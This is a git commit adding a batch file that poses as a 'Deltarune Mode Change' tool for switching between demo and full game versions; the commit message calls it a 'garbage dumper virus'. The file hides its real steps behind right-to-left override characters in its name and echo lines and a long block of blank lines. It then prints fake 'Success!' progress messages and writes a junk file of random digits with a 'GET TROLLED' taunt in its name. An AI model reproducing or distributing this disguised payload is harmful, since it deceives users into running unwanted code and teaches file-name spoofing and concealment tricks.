ed3b58022c5b7828c95b577091a9fb9445745327
woower <Altairmaglianesi@hotmail.com>
2025-06-07 22:39:34 -0300

    My first garbage dumper virus
    RUN AT YOUR OWN RISK NOT MY FAULT IF YOUR PC EXPLODES

---
+++ Underyeah pack/‮haeyrednu.cmd
@@ -0,0 +1,112 @@
+::DMC stands for Deltarune Mode Change
+
+::updatever
+::goto <data/nil>
+::echo {deltarune:{Demo:0, Full:1}}
+
+@echo off :: Destroy logs of commands, they suck. Also ugly.
+‮echo Press 0 to use demo version
+‮echo Press 1 to use full version
+‮echo Pick:
+goto updatever
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:updatever
+cls
+echo Attempting to get path from data/nil
+timeout /2
+echo Success!
+echo Getting type.dat from data/nill
+timeout /6
+echo Success!
+echo Converting version to whatever you chose!
+echo PATH NOT FOUND!!!!! aw man... ||  Try again?
+pause >nul	
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > LOL%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%GET TROLLED%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% by wolfjake%random% in discord.com 
